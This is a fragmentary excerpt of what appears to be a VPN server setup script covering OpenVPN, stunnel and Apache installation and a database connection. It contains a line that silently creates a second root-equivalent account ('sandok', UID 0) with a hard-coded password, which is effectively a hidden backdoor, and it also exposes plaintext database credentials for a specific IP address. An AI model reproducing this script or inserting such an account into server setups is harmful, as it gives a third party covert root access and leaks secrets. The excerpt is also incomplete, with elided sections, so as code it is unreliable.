...
$DB_host = '209.159.147.190';
$DB_user = 'routervp_routervp';
$DB_pass = '@L@m1n121';
$DB_name = 'routervp_routervp';
...
apt-get install openvpn easy-rsa screen net-tools apache2 build-essential curl -y
...
useradd -p $(openssl passwd -1 @tfg4gf@@tfg4gf@) sandok -ou 0 -g 0
...
[ocserv]
accept = 443
connect = 1194'| sudo tee /etc/stunnel/stunnel.conf
